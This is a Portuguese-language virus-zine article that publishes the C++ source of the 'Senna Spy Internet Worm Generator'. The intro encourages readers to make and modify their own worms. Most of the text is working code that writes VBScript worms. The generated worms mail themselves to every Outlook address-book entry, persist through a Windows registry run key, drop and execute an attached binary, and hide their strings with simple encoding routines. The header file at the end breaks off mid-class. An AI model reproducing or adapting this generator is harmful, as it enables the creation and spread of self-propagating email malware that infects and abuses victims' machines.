 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
                                 __   __
                           |  | |  | |__) |\/|
                           |/\| |__| |  \ |  |
 
 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

   컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
     11 - Senna Spy Internet Worm Generator (Codigo Fonte C++)
   컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

                 Valeu ao Senna Spy (sennaspy@uol.com.br) 


        Tenho aqui a honra de publicar os fontes daquele que foi o primeiro
   gerador de Internet Worm's do mundo !!!

        O programa esta para download no nosso site ( virusbrasil.8m.com ),
   as versoes 1.0 e 2.0, os fontes abaio sao da ultima versao,sem bugs, to-
   talmente funcional, e desculpe a sinceridade, muito bom, mesmo !!!

        O gerador foi escrito em C ++, e gera os worms .VBS numa boa, o co-
   digo esta totalmente comentado e como nao manjo porra nenhuma de C,  nao
   fiz nenhum comentario paralelo junto  ao codigo, nem mesmo sei  dizer se
   os arquivos que se encontram uuencodados no final do fonte podem ser ge-
   rados com o programa compilador,para nao dar erro, estao ai como o Senna
   os mandou.

        Para quem manja um pouco de C++ ira gostar muito do codigo e apren-
   dera muita  coisa nova... para quem nao manja bosta (igual eu) vale para
   futuras referencias.O gerador dispensa grandes comentarios, baixe ele da
   nossa home page e veja que nao tem onde se complicar, as opcoes sao auto
   explicaveis.

        Agora qualquer um pode fazer seu proprio Internet Worm, spread pelo
   Microsoft Outlook, se voce manja, os fontes estao ai, e  se tiver  tempo
   para modifica-lo, colocar um IRC spread tambem, sinta- se a vont'z,  soh
   avisa o Senna pra ele nao ficar cabrero, afinal ripar programas nos dias
   atuais nao eh coisa  muito dificil de se fazer, portanto se for alterar,
   faca bem feito !

        Vai aqui um pedido, se conhecer alguem que tenha  dito que  arrumou
   os fontes do windows, mande pro Senna, o cara ta doidinho atras dos fon-
   tes, (Ps. se quiser trocar, temos o do DOS !!!! )

        Nao tenho  muito mais o que falar, pois como voce ja deve estar  de
   saco cheio de ouvir, estou sem tempo.

        Fiquem com o codigo e divirtam-se.


                                        Sem mais,

                                                        nim_bus@hotmail.com


 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
      __   __ /  __   .   __    __          __   __        ___   __
     |    |  |  |  \  |  | _   |  |        |_   |  |  |\|   |   |_
     |__  |__|  |__/  |  |__|  |__|        |    |__|  | |   |   |__
									     
 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
/////////////////////////////////////////////////////////////////////////////
/////////////////////////////// geraworm.cpp ////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//                                                      //
// Senna Spy Internet Worm Generator 2000               //
// --------------------------------------               //
//                                                      //
// Primeiro Gerador de Worms para Internet do Mundo!    //
// Gera o Source Code de um Worm em VBScript.           //
//                                                      //
// O Codigo gerado, podera ser inserido em um Codigo    // 
// HTML ou executado diretamente com um Duplo-Clique.   //
//                                                      //
// Os Worms gerados, serao automaticamente enviados     //
// para todos os e-mails cadastrados no OutLook,        //
// ou seja, uma copia de si mesmo, sera anexada         //
// automaticamente, fazendo a contaminacao instantanea. //
//                                                      //
// O codigo trabalha como um "Virus Melissa-like".      //
//                                                      //
// History:                                             //
//                                                      //
//    Versao 1.0:  Sexta-Feira, 18 de Fevereiro de 2000 //
//    Versao 2.0:  Sabado,      21 de Outubro   de 2000 //
//                                                      //
//////////////////////////////////////////////////////////

#include <vcl.h>
#include "formmain.h"
#include "stdlib.h"
#include "stdio.h"

// Definicoes
#define  RAND_NOME_ROTINA_DECRIPTOGRAFIA  0
#define  RAND_ROTINA_DECRIPTOGRAFIA       1
#define  RAND_NOME_ROTINA_HEXA            2
#define  RAND_NOME_ARQUIVO_WORM           3

#define  TOTAL_ITENS                      3

// Variaveis Randomicas que Serao Usadas no Source do Worm
#define  RAND_VARIAVEL_01                 (      TOTAL_ITENS + 1 )
#define  RAND_VARIAVEL_02                 ( RAND_VARIAVEL_01 + 1 )
#define  RAND_VARIAVEL_03                 ( RAND_VARIAVEL_02 + 1 )
#define  RAND_VARIAVEL_04                 ( RAND_VARIAVEL_03 + 1 )
#define  RAND_VARIAVEL_05                 ( RAND_VARIAVEL_04 + 1 )
#define  RAND_VARIAVEL_06                 ( RAND_VARIAVEL_05 + 1 )
#define  RAND_VARIAVEL_07                 ( RAND_VARIAVEL_06 + 1 )
#define  RAND_VARIAVEL_08                 ( RAND_VARIAVEL_07 + 1 )
#define  RAND_VARIAVEL_09                 ( RAND_VARIAVEL_08 + 1 )
#define  RAND_VARIAVEL_10                 ( RAND_VARIAVEL_09 + 1 )
#define  RAND_VARIAVEL_11                 ( RAND_VARIAVEL_10 + 1 )
#define  RAND_VARIAVEL_12                 ( RAND_VARIAVEL_11 + 1 )
#define  RAND_VARIAVEL_13                 ( RAND_VARIAVEL_12 + 1 )
#define  RAND_VARIAVEL_14                 ( RAND_VARIAVEL_13 + 1 )
#define  RAND_VARIAVEL_15                 ( RAND_VARIAVEL_14 + 1 )
#define  RAND_VARIAVEL_16                 ( RAND_VARIAVEL_15 + 1 )
#define  RAND_VARIAVEL_17                 ( RAND_VARIAVEL_16 + 1 )

#define  RAND_TOTAL                       RAND_VARIAVEL_17
#define  RAND_GERAL                       ( TOTAL_ITENS + RAND_TOTAL + 1 )


//////////////////////////////////////////////////////////////////////////////////////
//                                                                                  //
// RAND_NOME_ROTINA_CRIPTOGRAFIA:                                                   //
//                                                                                  //
//    Nome da Rotina de Criptografia                                                //
//       - Maximo de 8 Caracteres - Somente Letras e Numeros                        //
//                                                                                  //
// RAND_ROTINA_CRIPTOGRAFIA:                                                        //
//                                                                                  //
//    Tipo de Rotina de Criptografia que Sera Usada na Criacao dos Sources do Worm: //
//       - 0 = Nenhuma Criptografia                                                 //
//       - 1 = Rotina String Normal Invertida                                       //
//       - 2 = Rotina ASC() + 1 Normal                                              //
//       - 3 = Rotina ASC() + 1 Invertida                                           //
//       - 4 = Rotina ASC() - 1 Normal                                              //
//       - 5 = Rotina ASC() - 1 Invertida                                           //
//                                                                                  //
// RAND_NOME_ARQUIVO_WORM:                                                          //
//                                                                                  //
//    Nome Randomico do Worm:                                                       //
//       - Maximo de 8 Caracteres - Somente Letras e Numeros                        //
//                                                                                  //
// RAND_VARIAVEL_01 a RAND_VARIAVEL_XX:                                             //
//                                                                                  //
//    Nome Randomico das Variaveis de Uso Geral do Worm                             //
//       - Maximo de 8 Caracteres - Somente Letras e Numeros                        //
//                                                                                  //
//////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
//                                                                            //
// GerarDadosRandomicos() - Gera os Dados Randomicos que Serao Usados no Worm //
//                                                                            //
////////////////////////////////////////////////////////////////////////////////

static void GerarDadosRandomicos( TStringList * MyRandomList )
{
    // Variaveis
    AnsiString cElemento;

    int nTamanho;

    int nLoop2;
    int nLoop;

    int nRand;

    // Cria Elementos Vazios
    for( nLoop = 0; nLoop < RAND_GERAL; nLoop ++ )
    {
         // Processa Eventos
         Application->ProcessMessages();

         // Somente para Itens Vazios
         if( MyRandomList->Strings[ nLoop ].IsEmpty() )
         {
             // Verifica se o Item a Ser Preenchido eh a Rotina de Criptografia
             if( nLoop == RAND_ROTINA_DECRIPTOGRAFIA )
             {
                 // Escolhe o Tipo de Rotina de Criptografia - de 1 a 5
                 do
                 {
                    nRand = random( 6 );
                 }
                 while( nRand < 1 || nRand > 5 );

                 // Define Qual Sera a Rotina de Decriptografia
                 MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] = IntToStr( nRand );
             }
             // Para os Outros Elementos...
             else
             {
                 // Obtem o Tamanho da Variavel
                 do
                 {
                    nTamanho = random( 9 );
                 }
                 while( nTamanho < 3 || nTamanho > 8 );

                 // Obtem o Primeiro Caracter - Deve ser Letra
                 do
                 {
                    nRand = random( 91 );
                 }
                 while( nRand < 'A' || nRand > 'Z' );

                 // Preenche Variavel
                 cElemento = AnsiString( (char) nRand );

                 // Gera Letra de Cada Variavel
                 for( nLoop2 = 1; nLoop2 < nTamanho; nLoop2 ++ )
                 {
                      // Obtem Letras e Numeros Somente
                      while( true )
                      {
                         nRand = random( 91 );

                         // Somente Caracteres Validos
                         if( ( nRand >= '0' && nRand <= '9' ) ||
                             ( nRand >= 'A' && nRand <= 'Z' ) )
                         {
                             break;
                         }
                      }

                      // Preenche Elemento
                      cElemento = cElemento + AnsiString( (char) nRand );
                 }

                 // Nao Podem Existir Elementos Repetidos...
                 if( MyRandomList->IndexOf( cElemento ) == -1 )
                     MyRandomList->Strings[ nLoop ] = cElemento;
                 else
                     GerarDadosRandomicos( MyRandomList );
             }
         }
    }
}


//////////////////////////////////////////
//                                      //
// Criptografa() - Criptografa os Dados //
//                                      //
//////////////////////////////////////////

AnsiString Criptografa( TStringList * MyRandomList, char * cDados )
{
   AnsiString cNovosDados = "";

   unsigned int nLoop;

   // Verifica a Rotina de Criptografia
   if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "0" )
   {
       return( "\"" + AnsiString( cDados ) + "\"" );
   }
   // Rotina Tipo 1 - String Normal Invertida
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "1" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = AnsiString( (char) cDados[ nLoop ] ) + cNovosDados;
   }
   // Rotina Tipo 2 - Rotina ASC()+1 - Normal
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "2" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = cNovosDados + AnsiString( (char) (cDados[ nLoop ] + 1) );
   }
   // Rotina Tipo 3 - Rotina ASC()+1 - Invertida
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "3" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = AnsiString( (char) (cDados[ nLoop ] + 1) ) + cNovosDados;
   }
   // Rotina Tipo 4 - Rotina ASC()-1 - Normal
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "4" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = cNovosDados + AnsiString( (char) (cDados[ nLoop ] - 1) );
   }
   // Rotina Tipo 5 - Rotina ASC()-1 - Invertida
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "5" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = AnsiString( (char) (cDados[ nLoop ] - 1) ) + cNovosDados;
   }

   // Retorno
   return( MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] + "( \"" + cNovosDados + "\" )" );
}


//////////////////////////////////////////////////
//                                              //
// GeraWormVBScript() - Gera o Worm em VBScript //
//                                              //
//////////////////////////////////////////////////

void GeraWormVBScript( AnsiString cArquivo )
{
   // Variaveis para Controle do Outlook
   AnsiString OL01, OL02, OL03, OL04, OL05;
   // Variaveis para Controle da Criptografia
   AnsiString CR01, CR02, CR03, CR04;
   // Variaveis para Controle do Registry
   AnsiString RG01, RG02;
   // Variaveis para Controle do Arquivo (File Join)
   AnsiString AR01, AR02, AR03;
   // Variaveis para Controle da Rotina de Conversao Hexa
   AnsiString HE01, HE02, HE03;

   AnsiString WORM;

   FILE * fArquivo;

   unsigned int nLoop;
   int nLoop2;

   // Criar Lista
   TStringList * MyRandomList = new TStringList();

      // Cria Elementos Vazios
      for( nLoop = 0; nLoop < RAND_GERAL; nLoop ++ )
           MyRandomList->Add( "" );

      // Verifica a Rotina de Criptografia
      if( FormWorm->CheckBoxCrypt->Checked )
      {
          // Gera os Dados Randomicos
          GerarDadosRandomicos( MyRandomList );
      }
      else
      {
          MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] = "DECRYPT";
          MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA      ] = "0";
          MyRandomList->Strings[ RAND_NOME_ROTINA_HEXA           ] = "HEXACONV";
          MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM          ] = "SENNASPY";

          MyRandomList->Strings[ RAND_VARIAVEL_01                ] = "OL01";
          MyRandomList->Strings[ RAND_VARIAVEL_02                ] = "OL02";
          MyRandomList->Strings[ RAND_VARIAVEL_03                ] = "OL03";
          MyRandomList->Strings[ RAND_VARIAVEL_04                ] = "OL04";
          MyRandomList->Strings[ RAND_VARIAVEL_05                ] = "OL05";
          MyRandomList->Strings[ RAND_VARIAVEL_06                ] = "CR01";
          MyRandomList->Strings[ RAND_VARIAVEL_07                ] = "CR02";
          MyRandomList->Strings[ RAND_VARIAVEL_08                ] = "CR03";
          MyRandomList->Strings[ RAND_VARIAVEL_09                ] = "CR04";
          MyRandomList->Strings[ RAND_VARIAVEL_10                ] = "RG01";
          MyRandomList->Strings[ RAND_VARIAVEL_11                ] = "RG02";
          MyRandomList->Strings[ RAND_VARIAVEL_12                ] = "AR01";
          MyRandomList->Strings[ RAND_VARIAVEL_13                ] = "AR02";
          MyRandomList->Strings[ RAND_VARIAVEL_14                ] = "AR03";
          MyRandomList->Strings[ RAND_VARIAVEL_15                ] = "HE01";
          MyRandomList->Strings[ RAND_VARIAVEL_16                ] = "HE02";
          MyRandomList->Strings[ RAND_VARIAVEL_17                ] = "HE03";
      }

      // Criar Lista
      TStringList * MyList = new TStringList();

         // Obtem os Nomes das Variaveis Randomicas
         OL01 = MyRandomList->Strings[ RAND_VARIAVEL_01 ];
         OL02 = MyRandomList->Strings[ RAND_VARIAVEL_02 ];
         OL03 = MyRandomList->Strings[ RAND_VARIAVEL_03 ];
         OL04 = MyRandomList->Strings[ RAND_VARIAVEL_04 ];
         OL05 = MyRandomList->Strings[ RAND_VARIAVEL_05 ];

         CR01 = MyRandomList->Strings[ RAND_VARIAVEL_06 ];
         CR02 = MyRandomList->Strings[ RAND_VARIAVEL_07 ];
         CR03 = MyRandomList->Strings[ RAND_VARIAVEL_08 ];
         CR04 = MyRandomList->Strings[ RAND_VARIAVEL_09 ];

         RG01 = MyRandomList->Strings[ RAND_VARIAVEL_10 ];
         RG02 = MyRandomList->Strings[ RAND_VARIAVEL_11 ];

         AR01 = MyRandomList->Strings[ RAND_VARIAVEL_12 ];
         AR02 = MyRandomList->Strings[ RAND_VARIAVEL_13 ];
         AR03 = MyRandomList->Strings[ RAND_VARIAVEL_14 ];

         HE01 = MyRandomList->Strings[ RAND_VARIAVEL_15 ];
         HE02 = MyRandomList->Strings[ RAND_VARIAVEL_16 ];
         HE03 = MyRandomList->Strings[ RAND_VARIAVEL_17 ];

         WORM = MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM ] + ".VBS";

         // Cria o Worm
         MyList->Add( "On Error Resume Next" );

         // Declaracao de Variaveis
         if( FormWorm->CheckBoxOutlook->Checked )
         {
             MyList->Add( "" );
             MyList->Add( "Dim " + OL01 + ", " +
                                   OL02 + ", " +
                                   OL03 + ", " +
                                   OL04 + ", " +
                                   OL05 );
         }

         if( FormWorm->CheckBoxRegistry->Checked )
         {
             MyList->Add( "" );
             MyList->Add( "Dim " + RG01 + ", " +
                                   RG02 );
         }

         if( ! FormWorm->PanelJoinFile->Caption.IsEmpty() )
         {
             MyList->Add( "" );
             MyList->Add( "Dim " + AR01 + ", " +
                                   AR02 + ", " +
                                   AR03 );
         }

         // Parte do Codigo para Inicializacao pelo Registry
         if( FormWorm->CheckBoxRegistry->Checked )
         {
             MyList->Add( "" );
             MyList->Add( "Set " + RG01 + " = CreateObject( " + Criptografa( MyRandomList, "Scripting.FileSystemObject" ) + " )" );

             MyList->Add( RG01 + ".CopyFile WScript.ScriptFullName, " +
                          RG01 + ".BuildPath( " +
                          RG01 + ".GetSpecialFolder(" +
                          IntToStr( FormWorm->RadioGroupWorm->ItemIndex ) +
                          "), " +
                          Criptografa( MyRandomList, WORM.c_str() ) +
                          " )" );

             MyList->Add( "" );
             MyList->Add( "Set " + RG02 + " = CreateObject( " + Criptografa( MyRandomList, "WScript.Shell" ) + " )" );

             MyList->Add( RG02 + ".RegWrite " +
                          Criptografa( MyRandomList, "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\" ) +
                          " & " +
                          Criptografa( MyRandomList, MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM ].c_str() ) +
                          ", " +
                          RG01 + ".BuildPath( " + RG01 + ".GetSpecialFolder(" + IntToStr( FormWorm->RadioGroupWorm->ItemIndex ) +
                          "), " +
                          Criptografa( MyRandomList, WORM.c_str() ) +
                          " )" );
         }

         // Parte de Criacao do Arquivo
         if( ! FormWorm->PanelJoinFile->Caption.IsEmpty() )
         {
             MyList->Add( "" );
             MyList->Add( "Set " + AR01 + " = CreateObject( " + Criptografa( MyRandomList, "Scripting.FileSystemObject" ) + " )" );

             MyList->Add( "Set " + AR02 + " = " +
                                   AR01 + ".CreateTextFile( " +
                                   AR01 + ".BuildPath( " +
                                   AR01 + ".GetSpecialFolder(" +
                                   IntToStr( FormWorm->RadioGroupExecutable->ItemIndex ) +
                                   "), " +
                                   Criptografa( MyRandomList, ExtractFileName( FormWorm->PanelJoinFile->Caption ).c_str() ) +
                                   " ), True )" );
             MyList->Add( "" );

             // Faz a Abertura do Arquivo
             if( ( fArquivo = fopen( FormWorm->OpenDialog1->FileName.c_str(), "rb" ) ) == NULL )
             {
                 ShowMessage( "Read file error !" );
             }
             else
             {
                 AnsiString cString;

                 int nContador = 0;
                 int nCaracter;

                 // Faz a Leitura de Todo o Arquivo
                 while( ! feof( fArquivo ) )
                 {
                    // Obtem o Caracter
                    nCaracter = fgetc( fArquivo );

                    // Converte Estrutura do Arquivo para Hexa
                    if( nCaracter != EOF )
                        cString = cString + IntToHex( nCaracter, 2 );

                    // Se Ultrapassou 40 Caracteres ou Fim-de-Arquivo...
                    if( ++ nContador > 40 || feof( fArquivo ) )
                    {
                        // Grava Linha
                        MyList->Add( AR02 +
                                     ".Write( " +
                                     MyRandomList->Strings[ RAND_NOME_ROTINA_HEXA ] +
                                     "( " +
                                     Criptografa( MyRandomList, cString.c_str() ) +
                                     " ) )" );

                        // Inicializa Variaveis
                        cString   = "";
                        nContador = 0;
                    }
                 }

                 // Fecha Arquivo
                 fclose( fArquivo );
             }

             MyList->Add( AR02 + ".Close" );

             // Executar Arquivo ?
             if( FormWorm->CheckBoxRunFile->Checked )
             {
                 MyList->Add( "" );
                 MyList->Add( "Set " + AR03 + " = CreateObject( " + Criptografa( MyRandomList, "WScript.Shell" ) + " )" );
                 MyList->Add( AR03 + ".Run( " +
                              AR01 + ".BuildPath( " +
                              AR01 + ".GetSpecialFolder(" +
                              IntToStr( FormWorm->RadioGroupExecutable->ItemIndex ) +
                              "), " +
                              Criptografa( MyRandomList, ExtractFileName( FormWorm->PanelJoinFile->Caption ).c_str() ) +
                              " ) )" );
             }
         }

         // Parte do Codigo para Outlook
         if( FormWorm->CheckBoxOutlook->Checked )
         {
             MyList->Add( "" );
             MyList->Add( "Set " + OL01 + " = CreateObject( " + Criptografa( MyRandomList, "Outlook.Application" ) + " )" );
             MyList->Add( "Set " + OL02 + " = " + OL01 + ".GetNameSpace( " + Criptografa( MyRandomList, "MAPI" ) + " )" );
             MyList->Add( "" );
             MyList->Add( "For Each " + OL03 + " In " + OL02 + ".AddressLists" );
             MyList->Add( "    For " + OL04 + " = 1 To " + OL03 + ".AddressEntries.Count" );
             MyList->Add( "        Set " + OL05 + " = " + OL01 + ".CreateItem( 0 )" );
             MyList->Add( "" );
             MyList->Add( "        " + OL05 + ".BCC = " + OL03 + ".AddressEntries( " + OL04 + " ).Address" );
             MyList->Add( "" );
             MyList->Add( "        " + OL05 + ".Subject = " + Criptografa( MyRandomList, FormWorm->EditSubject->Text.Trim().c_str() ) );
             MyList->Add( "        " + OL05 + ".Body = " + Criptografa( MyRandomList, FormWorm->MemoMessage->Lines->Text.Trim().c_str() ) );
             MyList->Add( "        " + OL05 + ".Attachments.Add WScript.ScriptFullName" );
             MyList->Add( "        " + OL05 + ".DeleteAfterSubmit = True" );
             MyList->Add( "        " + OL05 + ".Send" );
             MyList->Add( "    Next" );
             MyList->Add( "Next" );
         }

         // Somente se a Opcao de Arquivos (File Join) Estiver Selecionada
         if( ! FormWorm->PanelJoinFile->Caption.IsEmpty() )
         {
             MyList->Add( "" );
             MyList->Add( "Function " + MyRandomList->Strings[ RAND_NOME_ROTINA_HEXA ] + "( " + HE01 + " )" );
             MyList->Add( "   Dim " + HE02 );
             MyList->Add( "   Dim " + HE03 );
             MyList->Add( "" );
             MyList->Add( "   " + HE02 + " = \"\"" );
             MyList->Add( "" );
             MyList->Add( "   For " + HE03 + " = 1 To Len( " + HE01 + " ) Step 2" );
             MyList->Add( "       " + HE02 + " = " + HE02 + " & Chr( \"&h\" & Mid( " + HE01 + ", " + HE03 + ", 2 ) )" );
             MyList->Add( "   Next" );
             MyList->Add( "" );
             MyList->Add( "   " + MyRandomList->Strings[ RAND_NOME_ROTINA_HEXA ] + " = " + HE02 );
             MyList->Add( "End Function" );
         }

         // Somente se a Opcao de Criptografia Estiver Selecionada
         if( FormWorm->CheckBoxCrypt->Checked )
         {
             MyList->Add( "" );
             MyList->Add( "Function " + MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] + "( " + CR01 + " )" );
             MyList->Add( "   Dim " + CR02 );
             MyList->Add( "   Dim " + CR03 );
             MyList->Add( "   Dim " + CR04 );
             MyList->Add( "" );
             MyList->Add( "   " + CR02 + " = \"\"" );
             MyList->Add( "" );
             MyList->Add( "   For " + CR03 + " = 1 To Len( " + CR01 + " )" );
             MyList->Add( "       " + CR04 + " = Mid( " + CR01 + ", " + CR03 + ", 1 )" );
             MyList->Add( "" );

             // Rotina Tipo 1 - String Normal Invertida
             if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "1" )
             {
                 MyList->Add( "       " + CR02 + " = " + CR04 + " & " + CR02 );
             }
             // Rotina Tipo 2 - Rotina ASC()+1 - Normal
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "2" )
             {
                 MyList->Add( "       " + CR02 + " = " + CR02 + " & Chr( Asc( " + CR04 + " ) - 1 )" );
             }
             // Rotina Tipo 3 - Rotina ASC()+1 - Invertida
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "3" )
             {
                 MyList->Add( "       " + CR02 + " = Chr( Asc( " + CR04 + " ) - 1 ) & " + CR02 );
             }
             // Rotina Tipo 4 - Rotina ASC()-1 - Normal
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "4" )
             {
                 MyList->Add( "       " + CR02 + " = " + CR02 + " & Chr( Asc( " + CR04 + " ) + 1 )" );
             }
             // Rotina Tipo 5 - Rotina ASC()-1 - Invertida
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "5" )
             {
                 MyList->Add( "       " + CR02 + " = Chr( Asc( " + CR04 + " ) + 1 ) & " + CR02 );
             }

             MyList->Add( "   Next" );
             MyList->Add( "" );
             MyList->Add( "   " + MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] + " = " + CR02 );
             MyList->Add( "End Function" );
         }

         // NAO Alinhar Codigo ?
         if( ! FormWorm->CheckBoxAlign->Checked )
         {
             // Remove Espacos do Inicio e Fim de Cada Linha
             for( nLoop2 = 0; nLoop2 < MyList->Count; nLoop2 ++ )
                  MyList->Strings[ nLoop2 ] = MyList->Strings[ nLoop2 ].Trim();

             // Remove Linhas em Branco
             for( nLoop2 = MyList->Count - 1; nLoop2 >= 0; nLoop2 -- )
             {
                  if( MyList->Strings[ nLoop2 ].IsEmpty() )
                      MyList->Delete( nLoop2 );
             }
         }

         // Gravar o Source do Worm
         MyList->SaveToFile( cArquivo );

      // Libera Memoria
      delete MyList;

   // Libera Memoria
   delete MyRandomList;
}
/////////////////////////////////////////////////////////////////////////////
/////////////////////////////// geraworm.cpp ////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////// formmain.cpp ////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop

void GeraWormVBScript( AnsiString cArquivo );

#include "formmain.h"
#include "shellapi.h"
#include "stdlib.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TFormWorm *FormWorm;

AnsiString cPanelTitulo1;
AnsiString cPanelTitulo2;
AnsiString cPanelTitulo3;

AnsiString cCheckCrypt;

AnsiString cEditWormName;
AnsiString cEditSubject;
AnsiString cEditMessage;

AnsiString cLabelWormName;
AnsiString cLabelSubject;
AnsiString cLabelMessage;

AnsiString cBotaoSair;
AnsiString cBotaoCriar;

//---------------------------------------------------------------------------
__fastcall TFormWorm::TFormWorm(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::FormCreate(TObject *Sender)
{
   randomize();

   cPanelTitulo1     = FormWorm->PanelTitulo1->Caption;

   FormWorm->Caption = cPanelTitulo1;

   cCheckCrypt       = FormWorm->CheckBoxCrypt->Caption;

   cEditWormName     = FormWorm->EditWormName->Text;
   cEditSubject      = FormWorm->EditSubject->Text;
   cEditMessage      = FormWorm->MemoMessage->Lines->Text;

   cLabelWormName    = FormWorm->LabelWormName->Caption;
   cLabelSubject     = FormWorm->LabelSubject->Caption;
   cLabelMessage     = FormWorm->LabelMessage->Caption;

   cBotaoSair        = FormWorm->BotaoSair->Caption;
   cBotaoCriar       = FormWorm->BotaoCriar->Caption;
}
void __fastcall TFormWorm::BotaoSairClick(TObject *Sender)
{
   Application->Terminate();
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::BotaoCriarClick(TObject *Sender)
{
   // Forcar Posicionamento do Diretorio Destino ?
   if( RadioGroupWorm->Visible == false )
       RadioGroupWorm->ItemIndex = 0;

   // Gera Arquivo
   GeraWormVBScript( "yourworm.txt.vbs" );

   // Apresenta Mensagem
   ShowMessage( "Worm = 'YOURWORM.TXT.VBS' generated !" );

   // Finaliza Aplicacao
   Application->Terminate();
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::BotaoJoinFileClick(TObject *Sender)
{
    if( ! OpenDialog1->Execute() )
        return;

    PanelJoinFile->Caption = OpenDialog1->FileName;

    if( PanelJoinFile->Caption.IsEmpty() )
    {
        CheckBoxRunFile->Visible      = false;
        CheckBoxRunFile->Checked      = false;
        RadioGroupExecutable->Visible = false;
    }
    else
    {
        CheckBoxRunFile->Visible       = true;
        RadioGroupExecutable->Visible  = true;
    }
}
//---------------------------------------------------------------------------

void __fastcall TFormWorm::CheckBoxOutlookClick(TObject *Sender)
{
    LabelSubject->Enabled = CheckBoxOutlook->Checked;
    LabelMessage->Enabled = CheckBoxOutlook->Checked;

    EditSubject->Enabled  = CheckBoxOutlook->Checked;
    MemoMessage->Enabled  = CheckBoxOutlook->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TFormWorm::CheckBoxRegistryClick(TObject *Sender)
{
    RadioGroupWorm->Visible = CheckBoxRegistry->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TFormWorm::ButtonClearClick(TObject *Sender)
{
    OpenDialog1->FileName = "";    

    PanelJoinFile->Caption = "";

    RadioGroupExecutable->Visible = false;

    CheckBoxRunFile->Visible = false;
    CheckBoxRunFile->Checked = false;
}
//---------------------------------------------------------------------------
/////////////////////////////////////////////////////////////////////////////
/////////////////////////////// formmain.cpp ////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////////
///////////////////////////////// formain.h /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//---------------------------------------------------------------------------
#ifndef formmainH
#define formmainH
//---------------------------------------------------------------------------
#include <Classes.hpp>
#include <Controls.hpp>
#include <StdCtrls.hpp>
#include <Forms.hpp>
#include <ExtCtrls.hpp>
#include <Dialogs.hpp>
//---------------------------------------------------------------------------
class TFormWorm : public TForm
{
__published:	// IDE-managed Components
        TPanel *PanelTitulo1;
        TButton *BotaoSair;
        TGroupBox *GroupBox1;
        TLabel *LabelWormName;
        TEdit *EditWormName;
        TLabel *LabelSubject;
        TEdit *EditSubject;
        TLabel *LabelMessage;
    TCheckBox *CheckBoxCrypt;
        TButton *BotaoCriar;
    TCheckBox *CheckBoxOutlook;
    TCheckBox *CheckBoxAlign;
    TOpenDialog *OpenDialog1;
    TButton *BotaoJoinFile;
    TCheckBox *CheckBoxRunFile;
    TRadioGroup *RadioGroupWorm;
    TCheckBox *CheckBoxRegistry;
    TPanel *Panel1;
    TMemo *MemoMessage;
    TPanel *PanelJoinFile;
    TRadioGroup *RadioGroupExecutable;
    TButton *ButtonClear;
        void __fastcall FormCreate(TObject *Sender);
        void __fastcall BotaoSairClick(TObject *Sender);
        void __fastcall BotaoCriarClick(TObject *Sender);
    void __fastcall BotaoJoinFileClick(TObject *Sender);
    void __fastcall CheckBoxOutlookClick(TObject *Sender);
    void __fastcall CheckBoxRegistryClick(TObject *Sender);
